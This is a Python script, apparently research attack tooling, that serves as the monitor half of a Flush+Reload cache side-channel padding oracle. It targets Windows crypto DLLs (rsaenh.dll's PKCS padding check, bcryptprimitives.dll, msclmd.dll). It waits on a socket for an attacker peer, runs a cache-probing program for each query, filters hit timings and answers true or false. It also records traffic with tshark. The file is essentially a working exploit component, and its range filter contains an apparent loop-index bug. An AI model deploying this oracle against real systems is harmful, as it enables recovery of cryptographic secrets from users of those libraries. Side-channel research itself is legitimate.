
import socket

import argparse
import subprocess
import time
import os


from pdb import set_trace



def handle_lines_simple(lines):
    hits = [int(line.strip().split('#')[3]) for line in lines if '#' in line]
    good_hits = [hit for hit in hits if hit<=130]#100]
    #print(hits)
    #print(good_hits)
    if len(good_hits)>=3:#1:#2:
        return True
    return False

def create_conv_func(lines):
    time_lines = [line for line in lines if 'cycle' in line]
    first = time_lines[0].split(' ')
    last = time_lines[-1].split(' ')
    first_sec = float(first[3])
    last_sec = float(last[3])
    first_cycle = int(first[5])
    last_cycle = int(last[5])
    conv = (last_cycle-first_cycle)/(last_sec-first_sec+0.000000000000000001)
    to_cycles = lambda x: first_cycle+(x-first_sec)*conv

    return to_cycles


def create_reverse_conv_func(lines):
    time_lines = [line for line in lines if 'cycle' in line]
    first = time_lines[0].split(' ')
    last = time_lines[-1].split(' ')
    first_sec = float(first[3])
    last_sec = float(last[3])
    first_cycle = int(first[5])
    last_cycle = int(last[5])
    conv = (last_sec-first_sec)/(last_cycle-first_cycle+0.000000000000000001)
    to_sec = lambda x: first_sec+(x-first_cycle)*conv

    return to_sec


def filter_byrange(hits, hit_times, time_range):
    for i in range(len(hits)):
        if hit_times[i]>= time_range[0]:
            break
    else:
        filtered_hits = []
        filtered_hittimes = []
        return (filtered_hits, filtered_hittimes)
    for j in range(len(hits))[::-1]:
        if hit_times[i]<= time_range[1]:
            break
    else:
        filtered_hits = []
        filtered_hittimes = []
        return (filtered_hits, filtered_hittimes)
    filtered_hits = hits[i:j+1]
    filtered_hittimes = hit_times[i:j+1]
    return (filtered_hits, filtered_hittimes)
    

def filter_hits_above(hits, hit_times, val):
    fhits = []
    fhit_times = []
    for i in range(len(hits)):
        if hits[i] <= val:
            fhits.append(hits[i])
            fhit_times.append(hit_times[i])
    return (fhits, fhit_times)

def handle_lines_in_range(lines, finack_time, withVal = False, range_low = 0.12, range_high = 0.14, filter_level = 96):#, conv_func):
    hits = [int(line.strip().split('#')[3]) for line in lines if '#' in line]
    conv_func = create_reverse_conv_func(lines)
    hit_times = [conv_func(int(line.split(' ')[1].strip('\n#'))) for line in lines if '#' in line]
    mhit_times = [htime - finack_time for htime in hit_times]
    
    #(0.12, 0.14)) zero fp 2.6% fn
    fhits, fhit_times = filter_byrange(hits, mhit_times, (range_low, range_high))#0.16))#0.18)) #Bring back range?
    
    fhits100, fhit_times100 = filter_hits_above(fhits, fhit_times, filter_level)#96 is the 99th percentile of cache cycle counts - outlier removal#93)#100)
    
    if withVal:
        return len(fhits100)
    if len(fhits100) >= 1:#2:#1:#2#1:
        return True
    
  
    return False


def handle_lines(lines):
    hits = [int(line.strip().split('#')[3]) for line in lines if '#' in line]
    l1_hits = [hit for hit in hits if hit<=50]
    nol1hits = [hit for hit in hits if hit>50]
    l2_hits = [hit for hit in nol1hits if hit<=92]#100]#110]#90]
    nol2hits = [hit for hit in hits if hit>90]

    l3_hits = [hit for hit in nol2hits if hit<=100]#123]#124]#4] #124
    good_hits = [hit for hit in hits if hit<=123]#4]#5]#130]#100]
    #print(hits)
    #print(good_hits)
    if len(l1_hits) >=1:#2:#1#2: #2
        return True
    if len(l2_hits) >=1:#2:#1:#2:#3: #2
        return True
    
    return False




    
def handle_msg_ctrl(cur_i, attacker_sock, monitor_outfile, win11=False):

    filename_prefix=monitor_prefix+'_%d.txt' %(cur_i, )
    monitor_args_list = [args.monitor_program, "--addrcount", args.addrcount, "--target1",  args.first_bin,"--target2",  
                args.second_bin,"--target3",  
                args.third_bin, "--offset1", args.first_offset, "--offset2", args.second_offset, "--offset3", args.third_offset,
                "--output", filename_prefix, "--program_length", 
                args.monitor_length,"--flush_interval", args.flush_interval, "--probe_time", 
                args.probe_time, "--delta", args.delta , "--staller", '0']

    start_msg = attacker_sock[0].recv(1000)
    if b'Start monitor' in start_msg:
        monitor_p = subprocess.Popen(monitor_args_list, creationflags=subprocess.CREATE_NEW_CONSOLE)
        #>>> console_ctrl.send_ctrl_c(p.pid)
        #monitor_window.activate()
        recv_time = time.time()
        time.sleep(0.05)
        
        attacker_sock[0].send(b'Received at %f' %(recv_time, ))
        end_msg = attacker_sock[0].recv(1000)
        if b'Stop monitor' in end_msg:
            print("Found end monitor message")
            recv_stop = time.time()
            delay_time = float(end_msg.split(b':')[1])
            if args.is_verbose:
                monitor_outfile.write("Recv Start time: %f, Recv Stop time: %f, delay time: %f, filename: %s\n" %(recv_time, recv_stop, delay_time, filename_prefix, ))
            time.sleep(delay_time)
            console_ctrl.send_ctrl_c(monitor_p.pid)
            time.sleep(0.1) #0.5
            try:
                in_lines = open(filename_prefix, 'r').readlines()
            except:
                attacker_sock[0].send(b'Error')
                return
            print(len(in_lines))
            print("received")
            print(in_lines)
            #read the file and return oracle result
            if args.with_val:
                if win11:
                    val = handle_lines_in_range(in_lines, recv_stop, withVal = True, range_low=0.001, range_high=0.4, filter_level=125)#:
                else:
                    val = handle_lines_in_range(in_lines, recv_stop, withVal = True)#:
                attacker_sock[0].send(b'%d' %(val, ))
            else:
                if win11:
                    ret = handle_lines_in_range(in_lines, recv_stop, range_low=0.001, range_high=0.4, filter_level=125)
                else:
                    ret = handle_lines_in_range(in_lines, recv_stop)
                    
                if (ret):
            
                    attacker_sock[0].send(b'T')
                else:
                    attacker_sock[0].send(b'F')

    if b'Q' == start_msg:
        exit()




if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
 

    parser.add_argument('-p','--use_piv-tool', default=False, required=False)

    parser.add_argument('-c','--count', default=2, required=False)
    
    parser.add_argument('-mp','--monitor_program',choices=["..\\frwindb.exe", "..\\frwindb_double.exe", ".\\flush_reload_monitor.exe"], default=".\\flush_reload_monitor.exe", required=False)

    parser.add_argument('-a','--addrcount',default='1', required=False)
    
    parser.add_argument('--monitor_ip',default="192.168.1.2", required=False)
    parser.add_argument('--monitor_port',default="1940", required=False)
    
    
    #above is call to is legal key size
    parser.add_argument('-b1','--first_bin', default="C:\\Windows\\System32\\rsaenh.dll", required=False)
    parser.add_argument('-o1','--first_offset', default="0x2cf3", required=False) #VerifyPkcs2Padding

    
    
    parser.add_argument('-b2','--second_bin', default="C:\\Windows\\System32\\bcryptprimitives.dll", required=False)
    parser.add_argument('-o2','--second_offset', default="0x6a000", required=False) #CspImportSimpleBlobHelper  #  0x5b84 c3", required=False) 
    parser.add_argument('-b3','--third_bin', default="C:\\Windows\\System32\\msclmd.dll", required=False)

    parser.add_argument('-o3','--third_offset', default="0x1bac0", required=False) #EndCardCapiCall  #  0x5b84 c3", required=False) 
    
    parser.add_argument('-fi','--flush_interval', default="1", required=False)
    parser.add_argument('-ml','--monitor_length', default="50", required=False) #"9", required=False)
    #for first oracle
    parser.add_argument('-pt','--probe_time', default="300", required=False)
    
    parser.add_argument('-d', "--delta", default="0xac", required=False)
    #parser.add_argument('-s',"--sanity",default=False,required=False)
    #parser.add_argument('-sa',"--sanity_active",default=False,required=False)
    parser.add_argument('--is_verbose', type=bool,default=False, required=False)
    parser.add_argument('--with_val', type=bool,default=False, required=False)
    parser.add_argument('--on_win11', type=bool,default=False, required=False)
    
    args = parser.parse_args()
 
    use_pyautogui = False
    import console_ctrl
    todayy = time.asctime().replace(' ','_').replace(':','_')
    
    monitor_prefix = "fnr_results\\" +todayy+'pt_%s' %(args.probe_time, )#args.sanity,args.sanity_active, )
    #set_trace()
    monitor_outputfile = open(monitor_prefix+'_monitor_times.txt', 'w')
    monitor_outputfile.write(str(args))
    server_conn = socket.socket()
    server_conn.bind(("0.0.0.0", int(args.monitor_port)))#1940))#("192.168.1.2", 1930))#27.0.0.1", 1930))
    server_conn.listen(10)
    print("Waiting for server to connnect")

    tsharkproc = subprocess.Popen(['C:\\Program Files\\Wireshark\\tshark.exe', '-i', '9', '-f', 'tcp', '-w', monitor_prefix+'packets.pcapng'], creationflags=subprocess.CREATE_NEW_CONSOLE)
    
    attacker_sock = server_conn.accept() 
    print("server connnected")
    monitor_outputfile.write("Server connected at time %f" %(time.time(), ))
    first_msg = attacker_sock[0].recv(1000) #in bytes




    cur_msg = 0
    while True:
        if args.on_win11:
            handle_msg_ctrl(cur_msg, attacker_sock, monitor_outputfile, win11=True)
        else:
            handle_msg_ctrl(cur_msg, attacker_sock, monitor_outputfile)
        time.sleep(0.03)
        cur_msg += 1
        
    
    console_ctrl.send_ctrl_c(tsharkproc.pid)
    
    
